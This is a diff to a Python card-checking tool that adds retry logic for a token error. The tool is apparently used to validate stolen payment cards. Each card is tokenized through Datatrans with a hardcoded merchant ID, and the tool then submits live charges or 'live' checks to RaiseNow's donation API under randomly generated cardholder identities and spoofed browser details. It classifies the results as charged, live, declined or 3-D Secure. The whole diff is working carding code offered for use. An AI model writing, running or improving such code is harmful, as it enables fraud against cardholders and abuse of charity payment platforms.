@@ -55,89 +55,108 @@ def _perform_single_request(session, line, cc, mes, ano, cvv, bin_info, cancella
     This function does NOT handle retries. It just returns the raw result.
     """
     try:
-        user_agent = random_user_agent()
-        min_name, max_name = gate_config['name_length_range']
-        first_name = generate_random_string(random.randint(min_name, max_name))
-        last_name = generate_random_string(random.randint(min_name, max_name))
-        cardholder = f"{first_name} {last_name}"
-        email = random_email(gate_config['email_config'])
-        
-        street = generate_random_string(random.randint(20, 35))
-        house_number = generate_random_string(random.randint(20, 35))
-        postal_code = ''.join(random.choices(string.digits, k=5))
-        city = generate_random_string(random.randint(20, 35))
-        random_message = generate_random_string(random.randint(20, 35))
+        # --- NEW: Added retry logic for TOKENIZATION_NOT_FOUND ---
+        max_token_retries = 5
+        for token_attempt in range(max_token_retries):
+            if cancellation_event and cancellation_event.is_set():
+                return 'cancelled', line, 'User cancelled', bin_info
 
-        # --- Step 1: Tokenize ---
-        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
-        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
-        tokenize_payload = { "mode": "TOKENIZE", "formId": gate_config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
-        
-        token_response = session.post(tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
-        
-        if token_response.status_code == 403:
-            return 'gate_dead', line, f"[{gate_name}] GATE_DIED: 403 Forbidden on Tokenize", bin_info
-
-        token_response.raise_for_status() # Raise HTTPError for other bad responses (4xx, 5xx)
-
-        if "Card number not allowed in production" in token_response.text: return 'decline', line, f'[{gate_name}] INVALID_CARDNUMBER_DECLINE', bin_info
-        
-        token_data = token_response.json()
-        if "error" in token_data and "message" in token_data.get("error", {}): return 'decline', line, f'[{gate_name}] {token_data["error"]["message"]}', bin_info
-        transaction_id = token_data.get("transactionId")
-        if not transaction_id: return 'decline', line, f'[{gate_name}] {token_data.get("error", "Unknown error at Tokenize")}', bin_info
-
-        # --- Step 2: Payment ---
-        payment_headers = { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
-        
-        payload_str = json.dumps(gate_config['payload'])
-        replacements = {
-            "{{first_name}}": first_name, "{{last_name}}": last_name, "{{cardholder}}": cardholder,
-            "{{email}}": email, "{{user_agent}}": user_agent, "{{expiry_month}}": mes.zfill(2),
-            "{{expiry_year}}": ano, "{{transaction_id}}": transaction_id, "{{street}}": street,
-            "{{house_number}}": house_number, "{{postal_code}}": postal_code, "{{city}}": city,
-            "{{message}}": random_message
-        }
-        for placeholder, value in replacements.items():
-            payload_str = payload_str.replace(placeholder, value)
-        
-        base_payload = json.loads(payload_str)
-
-        if mode == 'charge':
-            payment_url = "https://api.raisenow.io/payments"
-            payment_payload = base_payload
-            payment_payload["amount"] = {"currency": gate_config['currency'], "value": charge_value}
-        else: # 'live' mode
-            payment_url = "https://api.raisenow.io/payment-sources"
-            payment_payload = base_payload
-            payment_payload["amount"] = {"currency": gate_config['currency'], "value": 50}
-
-        payment_response = session.post(payment_url, json=payment_payload, headers=payment_headers, timeout=20)
-        
-        if payment_response.status_code == 403:
-            return 'gate_dead', line, f"[{gate_name}] GATE_DIED: 403 Forbidden on Payment", bin_info
+            user_agent = random_user_agent()
+            min_name, max_name = gate_config['name_length_range']
+            first_name = generate_random_string(random.randint(min_name, max_name))
+            last_name = generate_random_string(random.randint(min_name, max_name))
+            cardholder = f"{first_name} {last_name}"
+            email = random_email(gate_config['email_config'])
             
-        payment_response.raise_for_status()
+            street = generate_random_string(random.randint(20, 35))
+            house_number = generate_random_string(random.randint(20, 35))
+            postal_code = ''.join(random.choices(string.digits, k=5))
+            city = generate_random_string(random.randint(20, 35))
+            random_message = generate_random_string(random.randint(20, 35))
 
-        response_text = payment_response.text
-        if '"payment_status":"succeeded"' in response_text:
-            return 'success', line, f'[{gate_name}] CHARGED_{charge_value/100:.2f}{gate_config["currency"]}', bin_info
-        elif '"payment_source_status":"pending"' in response_text:
-            return 'live_success', line, f'[{gate_name}] LIVE_SUCCESS', bin_info
-        elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text:
-            return 'decline', line, f'[{gate_name}] DECLINED', bin_info
-        elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text:
-            return 'custom', line, f'[{gate_name}] 3D_SECURE', bin_info
-        else:
-            return 'unknown', line, f'[{gate_name}] UNKNOWN_RESPONSE: {response_text}', bin_info
+            # --- Step 1: Tokenize ---
+            tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+            tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
+            tokenize_payload = { "mode": "TOKENIZE", "formId": gate_config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
+            
+            token_response = session.post(tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
+            
+            if token_response.status_code == 403:
+                return 'gate_dead', line, f"[{gate_name}] GATE_DIED: 403 Forbidden on Tokenize", bin_info
+
+            token_response.raise_for_status() # Raise HTTPError for other bad responses (4xx, 5xx)
+
+            if "Card number not allowed in production" in token_response.text: return 'decline', line, f'[{gate_name}] INVALID_CARDNUMBER_DECLINE', bin_info
+            
+            token_data = token_response.json()
+            if "error" in token_data and "message" in token_data.get("error", {}): return 'decline', line, f'[{gate_name}] {token_data["error"]["message"]}', bin_info
+            transaction_id = token_data.get("transactionId")
+            if not transaction_id: return 'decline', line, f'[{gate_name}] {token_data.get("error", "Unknown error at Tokenize")}', bin_info
+
+            # --- Step 2: Payment ---
+            payment_headers = { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
+            
+            payload_str = json.dumps(gate_config['payload'])
+            replacements = {
+                "{{first_name}}": first_name, "{{last_name}}": last_name, "{{cardholder}}": cardholder,
+                "{{email}}": email, "{{user_agent}}": user_agent, "{{expiry_month}}": mes.zfill(2),
+                "{{expiry_year}}": ano, "{{transaction_id}}": transaction_id, "{{street}}": street,
+                "{{house_number}}": house_number, "{{postal_code}}": postal_code, "{{city}}": city,
+                "{{message}}": random_message
+            }
+            for placeholder, value in replacements.items():
+                payload_str = payload_str.replace(placeholder, value)
+            
+            base_payload = json.loads(payload_str)
+
+            if mode == 'charge':
+                payment_url = "https://api.raisenow.io/payments"
+                payment_payload = base_payload
+                payment_payload["amount"] = {"currency": gate_config['currency'], "value": charge_value}
+            else: # 'live' mode
+                payment_url = "https://api.raisenow.io/payment-sources"
+                payment_payload = base_payload
+                payment_payload["amount"] = {"currency": gate_config['currency'], "value": 50}
+
+            payment_response = session.post(payment_url, json=payment_payload, headers=payment_headers, timeout=20)
+            
+            if payment_response.status_code == 403:
+                return 'gate_dead', line, f"[{gate_name}] GATE_DIED: 403 Forbidden on Payment", bin_info
+                
+            payment_response.raise_for_status()
+
+            response_text = payment_response.text
+
+            # --- NEW: TOKENIZATION_NOT_FOUND RETRY LOGIC ---
+            if "TOKENIZATION_NOT_FOUND" in response_text:
+                if token_attempt < max_token_retries - 1:
+                    logger.warning(f"Card {line} on Gate '{gate_name}' got TOKENIZATION_NOT_FOUND. Retrying payment request... (Attempt {token_attempt + 1}/{max_token_retries})")
+                    time.sleep(1) # Wait before retrying
+                    continue # Retry the whole process from tokenization
+                else:
+                    logger.error(f"Card {line} on Gate '{gate_name}' failed with TOKENIZATION_NOT_FOUND after {max_token_retries} retries.")
+                    return 'decline', line, f'[{gate_name}] TOKENIZATION_NOT_FOUND_FAIL', bin_info
+            # --- END NEW LOGIC ---
+
+            if '"payment_status":"succeeded"' in response_text:
+                return 'success', line, f'[{gate_name}] CHARGED_{charge_value/100:.2f}{gate_config["currency"]}', bin_info
+            elif '"payment_source_status":"pending"' in response_text:
+                return 'live_success', line, f'[{gate_name}] LIVE_SUCCESS', bin_info
+            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text:
+                return 'decline', line, f'[{gate_name}] DECLINED', bin_info
+            elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text:
+                return 'custom', line, f'[{gate_name}] 3D_SECURE', bin_info
+            else:
+                return 'unknown', line, f'[{gate_name}] UNKNOWN_RESPONSE: {response_text}', bin_info
 
     except requests.exceptions.RequestException as e:
         logger.warning(f"Request failed for gate '{gate_name}': {e}")
         return 'error', line, f"[{gate_name}] Connection Error: {e}", bin_info
     except json.JSONDecodeError as e:
+        logger.error(f"JSON Decode Error for gate '{gate_name}' on card {line}: {e}", exc_info=True)
         return 'error', line, f"[{gate_name}] JSON Decode Error: {e}", bin_info
     except Exception as e:
-        logger.error(f"Critical error in Generic Checker for gate '{gate_name}': {e}", exc_info=True)
+        logger.error(f"Critical error in Generic Checker for gate '{gate_name}' on card {line}: {e}", exc_info=True)
         return 'error', line, f"[{gate_name}] System Error: {e}", bin_info
 
 
